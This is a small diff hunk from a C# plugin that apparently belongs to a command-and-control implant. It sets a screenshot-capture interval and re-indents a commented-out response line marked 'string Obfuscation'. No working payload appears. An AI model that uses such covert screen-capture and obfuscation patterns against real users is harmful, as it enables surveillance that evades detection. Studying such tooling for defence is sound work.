@@ -61,7 +61,7 @@ namespace Plugins
                 {
                     completed = true,
                     user_output = $"Capturing screenshots delay between is {intervalInSeconds}.",
-                   //process_response = new Dictionary<string, string> { { "message", "0x45" + intervalInSeconds  } }, //string Obfuscation
+                    //process_response = new Dictionary<string, string> { { "message", "0x45" + intervalInSeconds  } }, //string Obfuscation
                     task_id = args["task-id"],
                 });
             }
